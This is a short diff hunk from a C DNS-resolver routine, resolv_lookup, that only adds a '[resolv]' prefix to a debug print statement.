@@ -215,7 +215,7 @@ struct resolv_entries *resolv_lookup(char *domain)
     close(fd);
 
 #ifdef DEBUG
-    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
+    printf("[resolv] Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
 #endif
 
     if (entries->addrs_len > 0)
